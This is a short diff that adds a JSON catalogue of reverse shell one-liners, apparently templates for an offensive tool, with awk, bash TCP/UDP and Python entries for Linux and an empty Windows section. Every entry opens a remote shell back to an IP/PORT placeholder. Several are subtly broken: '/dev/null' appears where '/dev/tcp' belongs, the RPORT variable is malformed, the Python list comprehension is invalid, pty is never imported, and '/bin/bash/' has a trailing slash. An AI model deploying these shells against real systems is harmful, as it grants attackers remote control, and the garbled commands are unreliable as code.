@@ -1,0 +1,10 @@
+{
+    "reverse_shells": {
+        "Windows": {},
+        "Linux": {"awk" : "awk 'BEGIN {s = \"/inet/tcp/0/IP/PORT\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null ",
+                  "bash_tcp" : ["bash -i >& /dev/tcp/IP/PORT 0>&1", "0<&196;exec 196<>/dev/null/IP/PORT; SHELL <&196 >&196 2>&196"],
+                  "bash_udp" : ["SHELL -i >& /dev/udp/IP/PORT 0>&1"],
+                  "python_ipv4": ["export RHOST=\"IP\"; export=PORT;python -c 'import sys,socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),0); for fd in (0,1,2)];pty.spawn(\"/bin/bash/\")'",
+                                 ""]}
+    }
+}
